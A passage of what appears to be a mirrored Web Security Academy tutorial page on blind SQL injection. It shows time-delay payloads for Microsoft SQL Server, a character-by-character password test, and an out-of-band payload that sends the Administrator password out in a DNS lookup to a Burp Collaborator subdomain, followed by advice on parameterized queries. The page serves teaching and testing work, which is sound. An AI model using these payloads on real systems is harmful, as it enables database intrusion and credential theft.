+        </p><p id="exploiting-blind-sql-injection-by-triggering-time-delays-5U1H" chunk-id="23386C53123EF4293C9334BD47181687">
+            The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:
+        </p><code class="code-scrollable">'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--</code><ul>
+            <li>
+                The first of these inputs does not trigger a delay, because the condition <code>1=2</code> is false.
+            </li>
+            <li>
+                The second input triggers a delay of 10 seconds, because the condition <code>1=1</code> is true.
+            </li>
+        </ul><p>
+            Using this technique, we can retrieve data by testing one character at a time:
+        </p><code class="code-scrollable">'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) &gt; 'm') = 1 WAITFOR DELAY '0:0:{delay}'--</code><div class="highlightedarea">
+            <h4>Note</h4>
+            <p>
+                There are various ways to trigger time delays within SQL queries, and different techniques apply on different types of database. For more details, see the <a href="cheat-sheet.html">SQL injection cheat sheet</a>.
+            </p>
+        </div><div widget-id="academy-labstatus" widget-lab-id="5D7C0F6AE7E03B08A47F4F6BFF758A7C1B154753EFEA5DC4D4B847F7D1EAB0A7">
+        </div><div widget-id="academy-labstatus" widget-lab-id="90B742428496FD275BBA4A89C5B13E2FA4DEA4BE3875EC8F6B09CDCD4CB63E7D">
+        </div><h2 id="exploiting-blind-sql-injection-using-out-of-band-oast-techniques" chunk-id="B494E65C8B8CEE2F37DAEAB5A5EBBE4D">Exploiting blind SQL injection using out-of-band (OAST) techniques</h2><p>
+            An application might carry out the same SQL query as the previous example but do it asynchronously. The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, but none of the techniques described so far will work. The application's response doesn't depend on the query returning any data, a database error occurring, or on the time taken to execute the query.
+        </p><p>
+            In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. These can be triggered based on an injected condition to infer information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.
+        </p><p>
+            A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). Many production networks allow free egress of DNS queries, because they're essential for the normal operation of production systems.
+        </p><p id="exploiting-blind-sql-injection-using-out-of-band-oast-techniques-1P3B" chunk-id="F83981B9C36F3D584509F3D8B04EEBEE">
+            The easiest and most reliable tool for using out-of-band techniques is <a href="https://portswigger.net/burp/documentation/collaborator">Burp Collaborator</a>. This is a server that provides custom implementations of various network services, including DNS. It allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. Burp Suite Professional includes a built-in client that's configured to work with Burp Collaborator right out of the box. For more information, see the documentation for
+            <a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator">Burp Collaborator</a>.
+        </p><p>
+            The techniques for triggering a DNS query are specific to the type of database being used. For example, the following input on Microsoft SQL Server can be used to cause a DNS lookup on a specified domain:
+        </p><code class="code-scrollable">'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--</code><p>
+            This causes the database to perform a lookup for the following domain:
+        </p><code class="code-scrollable">0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net</code><p>
+            You can use <a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator">Burp Collaborator</a> to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur.
+        </p><div widget-id="academy-labstatus" widget-lab-id="BD885D4DCA761E440E1C4056234B100F514A5BA06CB79DF59A7FDB02EDA2AF17">
+        </div><p id="exploiting-blind-sql-injection-using-out-of-band-oast-techniques-4Y2k" chunk-id="634BDAD2FE9B6D4B6DF2B65061920FEA">
+            Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:
+        </p><code class="code-scrollable">'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree &quot;//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a&quot;')--</code><p>
+            This input reads the password for the <code>Administrator</code> user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This lookup allows you to view the captured password:
+        </p><code class="code-scrollable">S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net</code><p>
+            Out-of-band (OAST) techniques are a powerful way to detect and exploit blind SQL injection, due to the high chance of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.
+        </p><div class="highlightedarea">
+            <h4>Note</h4>
+            <p>
+                There are various ways of triggering out-of-band interactions, and different techniques apply on different types of database. For more details, see the <a href="cheat-sheet.html">SQL injection cheat sheet</a>.
+            </p>
+        </div><div widget-id="academy-labstatus" widget-lab-id="365ED5E4A7DBEA87F7A659DD1349317F193BD4449F6AB6ED8062E5A319F553C6">
+        </div><h2 id="how-to-prevent-blind-sql-injection-attacks">How to prevent blind SQL injection attacks?</h2><p>
+            Although the techniques needed to find and exploit blind SQL injection vulnerabilities are different and more sophisticated than for regular SQL injection, the measures needed to prevent SQL injection are the same.
+        </p><p>
+            As with regular SQL injection, blind SQL injection attacks can be prevented through the careful use of parameterized queries, which ensure that user input cannot interfere with the structure of the intended SQL query.
+        </p><div class="highlightedarea">
+            <h4>Read more</h4>
+
+
+        <ul><li><a href="../sql-injection.html#how-to-prevent-sql-injection">How to prevent SQL injection</a></li><li><a href="https://portswigger.net/burp/vulnerability-scanner">Find blind SQL injection vulnerabilities using Burp Suite's web vulnerability scanner</a></li></ul></div>
+        
+    </div>
+
+
+    <script src="../../bundles/static-content/public/scripts/main18c2.js?v=NgmUiCsYwhVhi9Bra0okrfjnxkY" nonce="ipU88NCbjZGLM67vVK/YS7ngGYyHZJer"></script>
+    <script src="../../bundles/static-content/public/scripts/web-security5605.js?v=aLTI8D4Ps-_XoohiDNpR1LAARC0" nonce="ipU88NCbjZGLM67vVK/YS7ngGYyHZJer"></script>
+
+            
+        <div class="sidebar-content">
+            <div widget-id="academy-accountstatus"></div>
+            <div class="sidebar-trial-advert">
+                <img alt="Try Burp Suite for Free" src="../../content/images/logos/burp-suite-icon.svg">
+                <h4>Find SQL injection vulnerabilities using Burp Suite</h4>
+                <a class="button-white" href="https://portswigger.net/burp">Try for free</a>
+            </div>
+        </div>
+    
+        </main>
+    </div>
+</div>
+<footer class="wrapper">
+    <div class="container">
+        <div>
+            <p>Burp Suite</p>
+            <a href="https://portswigger.net/burp/vulnerability-scanner">Web vulnerability scanner</a>
+            <a href="https://portswigger.net/burp">Burp Suite Editions</a>
+            <a href="https://portswigger.net/burp/releases">Release Notes</a>
+        </div>
+        <div>
+            <p>Vulnerabilities</p>
+            <a href="../cross-site-scripting.html">Cross-site scripting (XSS)</a>
+            <a href="../sql-injection.html">SQL injection</a>
+            <a href="../csrf.html">Cross-site request forgery</a>
+            <a href="../xxe.html">XML external entity injection</a>
+            <a href="../file-path-traversal.html">Directory traversal</a>
+            <a href="../ssrf.html">Server-side request forgery</a>
+        </div>
+        <div>
+            <p>Customers</p>
+            <a href="https://portswigger.net/organizations">Organizations</a>
+            <a href="https://portswigger.net/testers">Testers</a>
+            <a href="https://portswigger.net/developers">Developers</a>
+        </div>
+        <div>
+            <p>Company</p>
+            <a href="https://portswigger.net/about">About</a>
+            <a href="https://portswigger.net/careers">Careers</a>
+            <a href="https://portswigger.net/about/contact">Contact</a>
+            <a href="https://portswigger.net/legal">Legal</a>
+            <a href="https://portswigger.net/privacy">Privacy Notice</a>
+        </div>
+        <div>
+            <p>Insights</p>
+            <a href="https://portswigger.net/web-security">Web Security Academy</a>
+            <a href="https://portswigger.net/blog">Blog</a>
+            <a href="https://portswigger.net/research">Research</a>
+        </div>
+        <div>
+            <a href="https://portswigger.net/"><img src="../../content/images/logos/portswigger-logo.svg" alt="PortSwigger Logo"
+                             class="footer-logo"></a>
+            <a class="button-outline-blue-small camelcase" href="https://twitter.com/Burp_Suite" rel="noreferrer"><span
+                    class="icon-twitter"></span> Follow us</a>
+            <p class="grey">&copy; 2026 PortSwigger Ltd.</p>
+        </div>
+    </div>
+</footer>
+<a href="#top" class="back-to-top"><svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 26 26">
+    <polygon points="4.07 14.7 5.03 15.78 12.48 9.13 19.94 15.78 20.9 14.7 12.48 7.2 4.07 14.7" fill="#f63"/>
+    <path d="M13,0A13,13,0,1,0,26,13,13,13,0,0,0,13,0Zm0,24.56A11.56,11.56,0,1,1,24.56,13,11.58,11.58,0,0,1,13,24.56Z"
+          fill="#f63"/>
+</svg></a>
+
+
+<script nonce="ipU88NCbjZGLM67vVK/YS7ngGYyHZJer" type="text/javascript">
+    piAId = '1067743';
+    piCId = '';
+    piHostname = 'go.portswigger.net';
+
+    (function () {
+        function async_load() {
+            var s = document.createElement('script');
+            s.type = 'text/javascript';
+            s.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + piHostname + '/pd.js';
+            var c = document.getElementsByTagName('script')[0];
+            c.parentNode.insertBefore(s, c);
+        }
+
+        if (window.attachEvent) {
+            window.attachEvent('onload', async_load);
+        } else {
+            window.addEventListener('load', async_load, false);
+        }
+    })();
+</script>
+</body>
+
+<!-- Mirrored from portswigger.net/web-security/sql-injection/blind by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 17 Apr 2026 22:05:45 GMT -->
+</html>
